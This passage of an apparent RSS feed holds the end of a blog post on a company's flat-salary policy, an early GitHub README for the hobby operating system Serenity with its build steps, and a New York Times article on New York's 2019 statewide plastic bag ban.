&lt;li class=&quot;post-list-item&quot;&gt;&lt;strong&gt;Dysfunction&lt;/strong&gt;. People tend to not like dysfunction, and dysfunction is really just a symptom of not understanding priorities. Yes, some people are just lazy, but if you can solve laziness, the best thing a manager can do is to be extraordinarily clear about the work ahead. Generally, if you can get smart people to work towards the same goals while avoiding institutional confusion, they’ll achieve great things.&lt;/li&gt;
&lt;li class=&quot;post-list-item&quot;&gt;&lt;strong&gt;Fairness&lt;/strong&gt;. The other thing people tend to not like is the feeling that their peers aren’t holding up their end of the bargain. And it’s especially bad when the person telling the team what to do isn’t doing anything themselves. The best way to make this a non-issue is to get dirty from the top-down. No one is above the rest — not even managers.&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote class=&quot;post-blockquote&quot; readability=&quot;36&quot;&gt;
&lt;p&gt;One-salary makes everyone feel they are an equal part of the team. Whether they’re in support, dev, or product areas, all have an equal voice. That equality helps avoid the “that’s above my pay grade, let someone else deal with it” attitude.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&quot;post-text&quot;&gt;…&lt;/p&gt;
&lt;blockquote class=&quot;post-blockquote&quot; readability=&quot;35&quot;&gt;
&lt;p&gt;(A completely flat structure) negates the need for traditional performance reviews and salary negotiation, which are very difficult for some people and do not favour those who have not been raised/trained/educated to advocate and negotiate hard for themselves. (And can be actively penalized for it, in the cases of some demographics.)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Is there a better way?&lt;/h2&gt;
&lt;p class=&quot;post-text&quot;&gt;When I talk about our flat salary, I often come at it from the angle of focusing on what alternatives would buy us. Barring a cash infusion, we have X dollars that can be allocated however we want. Right now we know precisely how much each position costs (because we all cost the same), but if we moved off our flat structure, what would that look like?&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;My best guess is that developer rates would go up, support rates would go down, and everyone else would be roughly the same. But it’s not like rates would change proportionally. At best it’s a wash, with support rates going down exactly the same as developer rates are going up, but that’s silly. SF rates for senior devs would cost far more than the savings we’d make on the support side, and the talent drain in support would make for a far inferior product. Plus, our support staff does a lot more than their direct tasks — they’re worth every penny they get paid.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;In reality, our flat-salary has probably allowed the company to grow faster than it would’ve under a traditional structure. I don’t think that was the intention going in, but it’s essentially put a movable ceiling on rates that have increased exponentially since we started around the 2008 recession. Our salaries are tied to profit, and while they’ve gone up over time, they just don’t compare to the whims of a company tied to an &lt;a class=&quot;post-link&quot; href=&quot;https://finance.yahoo.com/quote/GOOG/chart?p=GOOG&amp;amp;.tsrc=fin-srch#eyJpbnRlcnZhbCI6IndlZWsiLCJwZXJpb2RpY2l0eSI6MSwiY2FuZGxlV2lkdGgiOjEuMTEwNDg5NTEwNDg5NTEwNSwidm9sdW1lVW5kZXJsYXkiOnRydWUsImFkaiI6dHJ1ZSwiY3Jvc3NoYWlyIjp0cnVlLCJjaGFydFR5cGUiOiJsaW5lIiwiZXh0ZW5kZWQiOmZhbHNlLCJtYXJrZXRTZXNzaW9ucyI6e30sImFnZ3JlZ2F0aW9uVHlwZSI6Im9obGMiLCJjaGFydFNjYWxlIjoibGluZWFyIiwicGFuZWxzIjp7ImNoYXJ0Ijp7InBlcmNlbnQiOjEsImRpc3BsYXkiOiJHT09HIiwiY2hhcnROYW1lIjoiY2hhcnQiLCJ0b3AiOjB9fSwic2V0U3BhbiI6bnVsbCwibGluZVdpZHRoIjoyLCJzdHJpcGVkQmFja2dyb3VkIjp0cnVlLCJldmVudHMiOnRydWUsImNvbG9yIjoiIzAwODFmMiIsImV2ZW50TWFwIjp7ImNvcnBvcmF0ZSI6eyJkaXZzIjp0cnVlLCJzcGxpdHMiOnRydWV9LCJzaWdEZXYiOnt9fSwiY3VzdG9tUmFuZ2UiOm51bGwsInN5bWJvbHMiOlt7InN5bWJvbCI6IkdPT0ciLCJzeW1ib2xPYmplY3QiOnsic3ltYm9sIjoiR09PRyJ9LCJwZXJpb2RpY2l0eSI6MSwiaW50ZXJ2YWwiOiJ3ZWVrIiwic2V0U3BhbiI6bnVsbH1dLCJzdHVkaWVzIjp7InZvbCB1bmRyIjp7InR5cGUiOiJ2b2wgdW5kciIsImlucHV0cyI6eyJpZCI6InZvbCB1bmRyIiwiZGlzcGxheSI6InZvbCB1bmRyIn0sIm91dHB1dHMiOnsiVXAgVm9sdW1lIjoiIzAwYjA2MSIsIkRvd24gVm9sdW1lIjoiI0ZGMzMzQSJ9LCJwYW5lbCI6ImNoYXJ0IiwicGFyYW1ldGVycyI6eyJ3aWR0aEZhY3RvciI6MC40NSwiY2hhcnROYW1lIjoiY2hhcnQifX19LCJyYW5nZSI6bnVsbH0%253D&quot;&gt;out-of-control market&lt;/a&gt; or VC-infused debt.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;To me (and to be clear, I’m part of the flat salary with no ownership stake), it’s a fair deal because everything was on the table from day one. Everyone makes X, there’s no excessive Apple-esque cash hoard that’s being syphoned to investors instead of the staff, and we’re free to leave at any time.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;With that said, if we were to change, here are three models that seem acceptable (all have pros and cons):&lt;/p&gt;
&lt;ol class=&quot;post-ordered-list&quot;&gt;&lt;li class=&quot;post-list-item&quot;&gt;From an employee standpoint, the Basecamp model is a good way to maximize the retention and recruitment of “senior” talent while mostly keeping out the ugly popularity contests that come with salary negotiations. My understanding based on my recollection of the book &lt;a class=&quot;post-link&quot; href=&quot;https://basecamp.com/books/calm&quot;&gt;It Doesn’t Have to Be Crazy at Work&lt;/a&gt; is that hey pay an upper-tier salary &lt;em&gt;per position&lt;/em&gt; based (I think) on SF rates. They also use a junior/senior tier, which allows them to recruit raw talent without worrying about fair workloads (it’s be hard to justify paying the same salary to two devs who have vastly different levels of experience, but there’s also a lot of “grunt work” that needs to be done that might drive a senior person away).&lt;/li&gt;
&lt;li class=&quot;post-list-item&quot;&gt;This one was floated by someone in the internal survey: &lt;em&gt;”A possible solution to retaining talent longer term (who may start looking to move on for financial reasons) is to add a ‘years with the company’ accelerator. Putting the fiscal focus on retaining experience and talent seems more logical to me than hiring a ‘rockstar’ candidate and offering them double their colleague’s salary so they can shoot through some work and leave in a year or two.’’&lt;/em&gt; I generally like this, but it would probably have to be capped at some amount to avoid paying people too far above market rates. While retention is important, I don’t know if it’d make business sense to, say, pay someone triple what a comparable replacement would cost. And you don’t want to be in the position of laying off a tenured staffer because you mistakenly started paying them too much.&lt;/li&gt;
&lt;li class=&quot;post-list-item&quot;&gt;I’m not sure how the accounting would work, but if we kept the salary the same and tied it to a quarterly bonus structure based on company profits, it could create a more direct link between short-term productivity and income. (That’s not really a fundamental change though… more like a nudge.)&lt;/li&gt;
&lt;/ol&gt;&lt;p class=&quot;post-text&quot;&gt;Anyways, fishtoaster, here we are — getting by with a system that’s held up strong for ten years. We don’t have “more money than we know what to do with” (YET!!!), but I think everyone would agree that iwantmyname sits in the successful column of small businesses. And to me, that’s a win in the one-salary column.&lt;/p&gt;
&lt;p class=&quot;post-text&quot;&gt;I’ll make a note on my calendar to update this in 2024.&lt;/p&gt;

<title>Serenity: x86 Unix-like operating system for IBM PC-compatibles</title>
<link>https://github.com/awesomekling/serenity</link>
<guid isPermaLink="true" >https://github.com/awesomekling/serenity</guid>
<description>&lt;div class=&quot;Box-body&quot;&gt;
&lt;article class=&quot;markdown-body entry-content p-5&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;x86 Unix-like operating system for IBM PC-compatibles.&lt;/p&gt;
&lt;h2&gt;About&lt;/h2&gt;
&lt;p&gt;I always wondered what it would be like to write my own operating system, but I never took it seriously. Until now.&lt;/p&gt;
&lt;p&gt;I've grown tired of cutesy and condescending software that doesn't take itself or the user seriously. This is my effort to bring back the feeling of computing I once knew.&lt;/p&gt;
&lt;p&gt;Roughly speaking, the goal here is a marriage between the aesthetic of late-1990s productivity software and the power-user accessibility of late-2000s *nix. This is a system by me, for me, based on the things I like.&lt;/p&gt;
&lt;h2&gt;Screenshot&lt;/h2&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://raw.githubusercontent.com/awesomekling/serenity/master/Meta/screenshot-cdb82f6.png&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/awesomekling/serenity/master/Meta/screenshot-cdb82f6.png&quot; alt=&quot;Screenshot as of cdb82f6&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Current features&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;Pre-emptive multitasking&lt;/li&gt;
&lt;li&gt;Compositing window server&lt;/li&gt;
&lt;li&gt;IPv4 networking with ARP, TCP, UDP and ICMP&lt;/li&gt;
&lt;li&gt;ext2 filesystem&lt;/li&gt;
&lt;li&gt;Unix-like libc and userland&lt;/li&gt;
&lt;li&gt;mmap()&lt;/li&gt;
&lt;li&gt;/proc filesystem&lt;/li&gt;
&lt;li&gt;Local sockets&lt;/li&gt;
&lt;li&gt;Pseudoterminals&lt;/li&gt;
&lt;li&gt;Event-driven GUI library&lt;/li&gt;
&lt;li&gt;Text editor&lt;/li&gt;
&lt;li&gt;IRC client&lt;/li&gt;
&lt;li&gt;DNS lookup&lt;/li&gt;
&lt;li&gt;Other stuff I can't think of right now...&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;How do I build and run this?&lt;/h2&gt;
&lt;p&gt;You need a freestanding cross-compiler for the i686-elf target (for the kernel) and another cross-compiler for the i686-pc-serenity target (for all the userspace stuff.) It's probably possible to coerce it into building with vanilla gcc/clang if you pass all the right compiler flags, but I haven't been doing that for a while.&lt;/p&gt;
&lt;p&gt;There's &lt;a href=&quot;https://wiki.osdev.org/GCC_Cross-Compiler&quot; rel=&quot;nofollow&quot;&gt;a helpful guide on building a GCC cross-compiler&lt;/a&gt; on the OSDev wiki.&lt;/p&gt;
&lt;p&gt;I've only tested this on an Ubuntu 18.10 host with GCC 8.2.0, so I'm not sure it works anywhere else.&lt;/p&gt;
&lt;p&gt;If you'd like to run it, here's how you'd get it to boot:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;cd Kernel
./makeall.sh
./run            # Runs in QEMU
./run b          # Runs in bochs (limited networking support)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2&gt;Author&lt;/h2&gt;
&lt;h2&gt;License&lt;/h2&gt;
&lt;p&gt;Undecided. Probably something close to 2-clause BSD.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;

<title>Plastic Bags to Be Banned in New York</title>
<link>https://www.nytimes.com/2019/03/28/nyregion/plastic-bag-ban-.html</link>

<description>&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;&lt;em class=&quot;css-2fg4z9 e1gzwzxm0&quot;&gt;[What you need to know to start the day:&lt;/em&gt; &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/newsletters/newyorktoday?module=inline&quot; title=&quot;&quot;&gt;&lt;em class=&quot;css-2fg4z9 e1gzwzxm0&quot;&gt;Get New York Today in your inbox&lt;/em&gt;&lt;/a&gt;&lt;em class=&quot;css-2fg4z9 e1gzwzxm0&quot;&gt;.]&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;ALBANY — New York State lawmakers have agreed to impose a statewide ban on most types of single-use plastic bags from retail sales, changing a way of life for millions of New Yorkers as legislators seek to curb an unsightly and omnipresent source of litter.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;The plan, proposed a year ago by Gov. Andrew M. Cuomo, would be the second statewide ban, after California, which banned bags &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.calrecycle.ca.gov/plastics/carryoutbags&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;in 2016&lt;/a&gt;. Hawaii also effectively has a ban in place, since all the state’s counties bar such single-use bags.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;New York’s ban, which would begin next March, would forbid stores to provide customers with single-use plastic bags, which are nonbiodegradable and have been blamed for everything from causing &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nationalgeographic.com/environment/2018/11/dead-sperm-whale-filled-with-plastic-trash-indonesia/&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;gruesome wildlife deaths&lt;/a&gt; to &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.chicagotribune.com/business/ct-plastic-bag-ban-recycling-0731-biz-20150730-story.html&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;thwarting recycling efforts&lt;/a&gt;.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;The ban, which is expected to be part of &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/2019/03/31/nyregion/budget-new-york-congestion-pricing.html?module=inline&quot; title=&quot;&quot;&gt;the state’s budget bills that are slated to be passed by Monday&lt;/a&gt;, would have a number of carveouts, including food takeout bags used by restaurants, bags used to wrap deli or meat counter products and bags for bulk items. Newspaper bags would also be exempted, as would garment bags and bags sold in bulk, such as trash or recycling bags.&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;The plan would have an additional element allowing counties to opt in to a 5-cent fee on paper bags, revenue that would go to the state’s Environmental Protection Fund as well as a separate fund to buy reusable bags for consumers.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;In a statement released late Thursday afternoon, Mr. Cuomo said that “these bags have blighted our environment and clogged our waterways,” adding that the plan agreed to in Albany would be a way to “protect our natural resources for future generations of New Yorkers.”&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Supporters said that such a two-pronged approach — paper and plastic — was necessary not only to limit the flow of litter into the state’s streets, streams and oceanfront, but also to minimize the greenhouse emissions caused by their production.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;“There was a real understanding that there should be a ban on plastic,” said Todd Kaminsky, a Democratic state senator from Nassau County, who is the chairman of the &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nysenate.gov/senators/todd-kaminsky&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;environmental conservation committee&lt;/a&gt;. “And that if people go to paper rather than reusables, we are not that better off.”&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;The news of the agreement between Mr. Cuomo and his legislative counterparts comes less than a year after a similar effort stalled as a result of opposition from Republicans, who led the Senate, and from a rogue Democratic senator, Simcha Felder of Brooklyn, who collaborated with the Republicans. That political dynamic changed in November, when Democrats won eight seats in the Senate, sweeping themselves back into the majority and rendering Mr. Felder’s opinion moot.&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;The ban also marks an evolution for Mr. Cuomo, a third-term Democrat, who in 2017 signed a bill that effectively &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/2017/02/14/nyregion/cuomo-blocks-new-york-city-plastic-bag-law.html?module=inline&quot; title=&quot;&quot;&gt;killed a New York City law&lt;/a&gt; that would have imposed a 5-cent fee on plastic bags. The New York City fee had also been opposed by some in the State Assembly, which has been dominated by Democrats, who worried that the fee would act as a regressive tax on poor consumers.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;As outlined, however, the plan to allow counties to avoid fees on paper bags would seemingly address those concerns. But that provision also left some environmental advocates disappointed; they argue that by not mandating a paper-bag fee, many people will simply use paper bags instead of reusable bags.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Peter Iwanowicz, the executive director of Environmental Advocates of New York, said the provision to make paper-bag fees optional made the proposed plan “a weak response to the scourge of disposable bags.”&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;“New York had a chance to show real leadership and came up short,” he said.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;The agreement was also being criticized by business and trade groups, including the Food Industry Alliance of New York State, which represents grocery stores, a major target of such bans and fees.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Mike Durant, the group’s president, said the proposed law would “have a drastic impact on retailers,” and predicted confusion because of the opt-in provision. Mr. Durant also criticized the allocation of paper-bag fee revenue to the environmental and bag funds.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;“The failure to give even a portion of the 5-cent fee back to the stores, makes this an untenable mandate for many of our members who operate within finite profit margins,” said Mr. Durant. He added, “We are disappointed that the Legislature did not consider this alternative and failed to hear the concerns of the business community.”&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Small business groups also expressed concern. “Every mandated cost increase adds up,” said Greg Biryla, the New York director of National Federation of Independent Business. “Independent businesses are simply not able to absorb and adjust to new mandated costs the same as their big-box competitors.”&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;
&lt;div class=&quot;css-1fanzo5 StoryBodyCompanionColumn&quot;&gt;
&lt;div class=&quot;css-53u6y8&quot;&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Though such laws have been &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.plasticbaglaws.org/litigation&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;the subject of lawsuits in the past&lt;/a&gt;, several cities and other localities have imposed fees on single-use carryout bags, including Suffolk County, where such a plan led to &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.newsday.com/business/suffolk-nickel-plastic-bag-fee-reusable-1.24755898&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;a sharp reduction&lt;/a&gt; in their use.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;Such a disincentive is also the goal of the state plan, said Mr. Kaminsky, whose hometown, Long Beach, N.Y., has &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.longbeachny.gov/?SEC=CDED59DF-3AFA-4D0B-A23D-389A7FB9C74A&quot; title=&quot;&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;such a program&lt;/a&gt;.&lt;/p&gt;
&lt;p class=&quot;css-1ygdjhk evys1bk0&quot;&gt;“I think we’ll look back in a few years,” he said. “And people will wonder why we didn’t do this sooner.”&lt;/p&gt;
&lt;/div&gt;
&lt;aside class=&quot;css-o6xoe7&quot;/&gt;&lt;/div&gt;
